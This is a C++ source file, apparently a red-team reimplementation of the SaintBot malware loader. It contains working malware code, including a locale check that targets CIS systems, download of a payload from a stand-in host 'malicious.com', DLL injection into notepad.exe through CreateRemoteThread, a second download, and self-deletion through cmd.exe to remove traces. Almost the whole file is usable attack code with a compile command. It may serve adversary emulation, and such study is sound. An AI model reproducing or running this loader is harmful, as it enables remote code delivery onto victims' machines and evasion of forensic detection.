// SaintBot payload Loader includes the following components:

// 1.Locale Check: The IsSupportedLocale function checks if the system's locale matches specific locales.
// 2.Downloading Payload: The DownloadPayload function downloads a file from a specified URL and saves it to a specified filepath.
// 3.Injecting into a Process: The InjectIntoProcess function injects a DLL into a running process by its name.
// 4.Self-Deleting: The SelfDelete function deletes the executable after its execution.

// Author: S3N4T0R
// Date: 2024-7-4

// manual compile: x86_64-w64-mingw32-g++ -o SaintBot.exe SaintBot.cpp -lwininet

#include <windows.h>
#include <wininet.h>
#include <string>
#include <tlhelp32.h>

#pragma comment(lib, "wininet.lib")

typedef NTSTATUS(WINAPI *pNtQueryDefaultLocale)(BOOLEAN, PLCID);

BOOL IsSupportedLocale()
{
    HMODULE hNtdll = LoadLibrary("ntdll.dll");
    if (!hNtdll) return FALSE;

    pNtQueryDefaultLocale NtQueryDefaultLocale = (pNtQueryDefaultLocale)GetProcAddress(hNtdll, "NtQueryDefaultLocale");
    if (!NtQueryDefaultLocale) {
        FreeLibrary(hNtdll);
        return FALSE;
    }

    LCID DefaultLocaleId = 0;
    if (NtQueryDefaultLocale(FALSE, &DefaultLocaleId) >= 0)
    {
        FreeLibrary(hNtdll);
        return (DefaultLocaleId == 0x419 ||  // Russian (Russia)
                DefaultLocaleId == 0x422 ||  // Ukrainian (Ukraine)
                DefaultLocaleId == 0x423 ||  // Belarusian (Belarus)
                DefaultLocaleId == 0x42B ||  // Armenian (Armenia)
                DefaultLocaleId == 0x43F ||  // Kazakh (Kazakhstan)
                DefaultLocaleId == 0x818 ||  // Romanian (Moldova)
                DefaultLocaleId == 0x819);   // Russian (Moldova)
    }
    FreeLibrary(hNtdll);
    return FALSE;
}

BOOL DownloadPayload(const char* url, const char* filepath)
{
    HINTERNET hInternet = InternetOpen("Mozilla/5.0", INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, 0);
    if (hInternet == NULL) return FALSE;

    HINTERNET hConnect = InternetOpenUrl(hInternet, url, NULL, 0, INTERNET_FLAG_RELOAD, 0);
    if (hConnect == NULL)
    {
        InternetCloseHandle(hInternet);
        return FALSE;
    }

    BYTE buffer[4096];
    DWORD bytesRead;
    HANDLE hFile = CreateFile(filepath, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
    if (hFile == INVALID_HANDLE_VALUE)
    {
        InternetCloseHandle(hConnect);
        InternetCloseHandle(hInternet);
        return FALSE;
    }

    while (InternetReadFile(hConnect, buffer, sizeof(buffer), &bytesRead) && bytesRead)
    {
        DWORD bytesWritten;
        WriteFile(hFile, buffer, bytesRead, &bytesWritten, NULL);
    }

    CloseHandle(hFile);
    InternetCloseHandle(hConnect);
    InternetCloseHandle(hInternet);

    return TRUE;
}

BOOL InjectIntoProcess(const char* processName, const char* dllPath)
{
    HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (hSnapshot == INVALID_HANDLE_VALUE) return FALSE;

    PROCESSENTRY32 pe;
    pe.dwSize = sizeof(PROCESSENTRY32);

    if (!Process32First(hSnapshot, &pe))
    {
        CloseHandle(hSnapshot);
        return FALSE;
    }

    DWORD processId = 0;
    do
    {
        if (!_stricmp(pe.szExeFile, processName))
        {
            processId = pe.th32ProcessID;
            break;
        }
    } while (Process32Next(hSnapshot, &pe));

    CloseHandle(hSnapshot);

    if (processId == 0) return FALSE;

    HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, processId);
    if (hProcess == NULL) return FALSE;

    LPVOID pRemoteMemory = VirtualAllocEx(hProcess, NULL, strlen(dllPath) + 1, MEM_COMMIT, PAGE_READWRITE);
    if (pRemoteMemory == NULL)
    {
        CloseHandle(hProcess);
        return FALSE;
    }

    WriteProcessMemory(hProcess, pRemoteMemory, dllPath, strlen(dllPath) + 1, NULL);

    HANDLE hThread = CreateRemoteThread(hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)LoadLibraryA, pRemoteMemory, 0, NULL);
    if (hThread == NULL)
    {
        VirtualFreeEx(hProcess, pRemoteMemory, 0, MEM_RELEASE);
        CloseHandle(hProcess);
        return FALSE;
    }

    WaitForSingleObject(hThread, INFINITE);

    VirtualFreeEx(hProcess, pRemoteMemory, 0, MEM_RELEASE);
    CloseHandle(hThread);
    CloseHandle(hProcess);

    return TRUE;
}

void SelfDelete()
{
    TCHAR szFileName[MAX_PATH];
    TCHAR szCmd[MAX_PATH];

    if (GetModuleFileName(NULL, szFileName, MAX_PATH))
    {
        sprintf_s(szCmd, "cmd.exe /c del \"%s\" & exit", szFileName);
        STARTUPINFO si = { sizeof(STARTUPINFO) };
        PROCESS_INFORMATION pi;
        CreateProcess(NULL, szCmd, NULL, NULL, FALSE, CREATE_NO_WINDOW, NULL, NULL, &si, &pi);
    }
}

int main()
{
    if (!IsSupportedLocale()) return 0;

    const char* url = "http://malicious.com/payload.exe";
    const char* filepath = "C:\\Windows\\Temp\\payload.exe";

    if (DownloadPayload(url, filepath))
    {
        // Execute the payload by injection
        InjectIntoProcess("notepad.exe", filepath);

        // Update the executable if needed
        DownloadPayload("http://malicious.com/update.exe", filepath);

        // Remove traces
        SelfDelete();
    }

    return 0;
}

